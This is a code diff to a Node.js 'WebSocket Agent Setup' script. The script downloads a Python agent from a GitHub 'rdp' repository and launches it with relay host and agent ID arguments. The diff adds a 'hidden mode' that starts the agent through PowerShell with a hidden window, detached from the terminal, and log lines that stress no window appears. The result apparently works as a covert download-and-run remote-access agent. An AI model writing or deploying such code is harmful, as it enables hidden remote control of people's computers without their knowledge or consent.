@@ -4,7 +4,7 @@ const fs = require('fs');
 const https = require('https');
 const http = require('http');
 
-console.log('Starting WebSocket Agent Setup...');
+console.log('Starting WebSocket Agent Setup (Hidden Mode)...');
 
 // Function to download a file from URL
 function downloadFile(url, destination) {
@@ -38,35 +38,37 @@ function downloadFile(url, destination) {
     });
 }
 
-// Function to run a command and return a promise
-function runCommand(command, args = [], options = {}) {
+// Function to run Python script completely hidden using PowerShell
+function runPythonHidden(scriptPath, args = []) {
     return new Promise((resolve, reject) => {
-        console.log(`Executing: ${command} ${args.join(' ')}`);
+        console.log(`Executing Python (hidden): ${scriptPath} ${args.join(' ')}`);
         
-        const child = spawn(command, args, {
-            stdio: ['ignore', 'pipe', 'pipe'], // Redirect output to pipes instead of inherit
+        // Use PowerShell to start Python with hidden window
+        const psCommand = `Start-Process python -ArgumentList '${scriptPath}', '${args.join("', '")}' -WindowStyle Hidden -PassThru`;
+        
+        const child = spawn('powershell', ['-Command', psCommand], {
+            stdio: ['ignore', 'pipe', 'pipe'],
             shell: true,
-            detached: true, // Detach the child process from parent
-            windowsHide: true, // Hide the window on Windows
-            ...options
+            detached: true,
+            windowsHide: true
         });
         
-        // Unref the child process so it doesn't keep the parent alive
         child.unref();
         
-        // Log any output from the background process
+        // Get the process ID from PowerShell output
         child.stdout.on('data', (data) => {
-            console.log(`[Agent] ${data.toString().trim()}`);
+            const output = data.toString().trim();
+            if (output && !isNaN(output)) {
+                console.log(`✅ Hidden Python process started with PID: ${output}`);
+            }
         });
         
         child.stderr.on('data', (data) => {
-            console.error(`[Agent Error] ${data.toString().trim()}`);
+            console.error(`[PowerShell Error] ${data.toString().trim()}`);
         });
         
-        // Don't wait for the child to close since we want it to run independently
-        console.log(`✅ Process started with PID: ${child.pid}`);
-        console.log('The Python agent is now running in the background.');
-        console.log('You can close this terminal and the agent will continue running.');
+        console.log('The Python agent is now running completely hidden.');
+        console.log('No visible terminal window will be opened.');
         resolve();
         
         child.on('error', (error) => {
@@ -76,7 +78,7 @@ function runCommand(command, args = [], options = {}) {
     });
 }
 
-async function startAgent() {
+async function startAgentHidden() {
     try {
         // Configuration - you can modify these URLs
         const pythonScriptUrl = process.env.PYTHON_SCRIPT_URL || 'https://raw.githubusercontent.com/Pharaon3/rdp/main/websocket_agent.py';
@@ -95,11 +97,28 @@ async function startAgent() {
         
         // Step 2: Install websockets package
         console.log('\n📦 Installing websockets package...');
-        await runCommand('pip', ['install', 'websockets']);
+        const pipChild = spawn('pip', ['install', 'websockets'], {
+            stdio: 'inherit',
+            shell: true
+        });
         
-        // Step 3: Run the websocket agent
-        console.log('\n🚀 Starting WebSocket agent...');
-        await runCommand('python', [pythonScriptPath, relayHost, relayPort, agentId]);
+        await new Promise((resolve, reject) => {
+            pipChild.on('close', (code) => {
+                if (code === 0) {
+                    console.log('✅ Websockets package installed');
+                    resolve();
+                } else {
+                    reject(new Error(`Pip install failed with code ${code}`));
+                }
+            });
+        });
+        
+        // Step 3: Run the websocket agent completely hidden
+        console.log('\n🚀 Starting WebSocket agent in hidden mode...');
+        await runPythonHidden(pythonScriptPath, [relayHost, relayPort, agentId]);
+        
+        console.log('\n✅ Setup complete! The agent is running completely hidden.');
+        console.log('You can now close this terminal safely.');
         
     } catch (error) {
         console.error('❌ Failed to start agent:', error.message);
@@ -119,4 +138,4 @@ process.on('SIGTERM', () => {
 });
 
 // Start the agent
-startAgent(); 
+startAgentHidden(); 
